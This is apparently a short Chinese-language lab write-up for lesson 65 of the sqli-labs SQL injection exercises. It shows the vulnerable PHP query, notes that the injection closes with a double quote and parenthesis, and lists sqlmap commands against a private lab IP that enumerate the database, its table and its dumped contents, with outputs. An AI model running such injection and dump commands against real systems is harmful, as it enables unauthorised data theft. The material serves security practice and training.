---
title: less65
url: https://www.yuque.com/u29002979/ep2zrx/grncbn27lnnihxeu
---

```bash
$id = '"'.$id.'"';
// Querry DB to get the correct output
$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";
```

最后的闭合方式为双引号加小括号**") ** <a name="tTcqx"></a>

# sqlmap

`sqlmap -u http://192.168.31.193/Less-65/?id=1 --current-db `

> challenges

`sqlmap -u http://192.168.31.193/Less-65/?id=1 -D challenges --tables`

> ha0jys304v

`sqlmap -u http://192.168.31.193/Less-65/?id=1 -D challenges -T ha0jys304v --dump`

> WNpZ8ZytUpExmC9fRdiAtLF2
